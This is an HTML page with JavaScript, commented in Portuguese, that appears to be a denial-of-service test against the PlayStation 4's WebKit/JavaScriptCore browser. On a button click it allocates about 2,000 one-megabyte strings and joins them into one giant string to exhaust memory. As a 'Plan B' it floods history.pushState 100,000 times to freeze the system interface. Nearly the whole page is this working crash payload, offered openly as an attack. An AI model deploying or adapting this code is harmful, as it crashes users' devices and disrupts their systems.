<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 JSC Heap Crash</title>
    
</head>
<body>
    <h1>JavaScriptCore String Stress</h1>
    <p>Target: Force contiguous memory allocation (Bypass Lazy Alloc).</p>

    <button onclick="runStringAttack()">TEST: STRING FLATTENING (CRASH)</button>
    
    

    <script>
        function log(msg) { 
            document.getElementById('log').innerText += "\n" + msg; 
        }

        function runStringAttack() {
            log("Creating a fragmented array");
            
            setTimeout(() => {
                try {
                    // Cria um array com milhares de strings de 10MB cada
                    // Isso fragmenta a Heap rapidamente
                    var hugeArray = [];
                    var chunk = new Array(1024 * 1024).join("A"); // ~1MB String
                    
                    for(let i=0; i < 2000; i++) {
                        hugeArray.push(chunk);
                        if(i % 200 === 0) log("Alocado: " + i + "MB");
                    }

                    log("Fase 2: O ACHATAMENTO (The Flattening)...");
                    log("Atenção: O navegador deve travar agora.");

                    // O GOLPE FINAL:
                    // .join('') força o WebKit a pegar todas as peças espalhadas
                    // e tentar colocá-las num bloco ÚNICO e GIGANTE de memória.
                    // A maioria dos sistemas não tem um bloco contínuo desse tamanho livre.
                    var flatString = hugeArray.join("");
                    
                    // Se sobreviveu, vamos tentar manipular para garantir que a memória foi escrita
                    log("Tamanho final: " + flatString.length);
                    var upper = flatString.toUpperCase(); // Força cópia (2x memória)
                    
                } catch(e) {
                    log("Erro (Browser Protegeu): " + e.message);
                    log("Tentando Loop Infinito de Histórico como 'Plano B'...");
                    
                    // Plano B: History Flooding (Trava a UI do sistema)
                    for(let i=0; i<100000; i++) {
                        history.pushState(0,0, i.toString());
                    }
                }
            }, 100);
        }
    </script>
</body>
</html>

